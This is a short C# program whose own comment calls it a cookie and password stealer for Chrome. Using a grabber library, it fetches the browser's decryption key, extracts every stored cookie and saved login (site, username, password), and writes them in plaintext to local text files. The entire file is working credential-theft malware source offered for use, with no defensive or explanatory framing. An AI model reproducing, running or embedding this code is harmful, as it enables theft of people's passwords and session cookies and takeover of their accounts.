using CockyGrabber;
using System;
using System.Collections.Generic;
//Cookies & passwords stealer for chrome

using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Chromegrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            StringBuilder cookieschrome = new StringBuilder();
            StringBuilder passwordschrome = new StringBuilder();

            ChromeGrabber cg = new ChromeGrabber();
            if (cg.CookiesExists() && cg.PasswordsExists() && cg.KeyExists())
            {
                foreach (var item in cg.GetAllCookies(cg.GetKey()))
                {
                    cookieschrome.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }

                foreach (var item in cg.GetAllPasswords(cg.GetKey()))
                {
                    passwordschrome.AppendLine(item.url + " = " + item.username + ":" + item.password);
                }
            }

            File.WriteAllText("cookies.txt", cookieschrome.ToString());
            File.WriteAllText("password.txt", passwordschrome.ToString());
            Console.Write("Done !");
            Console.ReadKey();
        }
    }
}
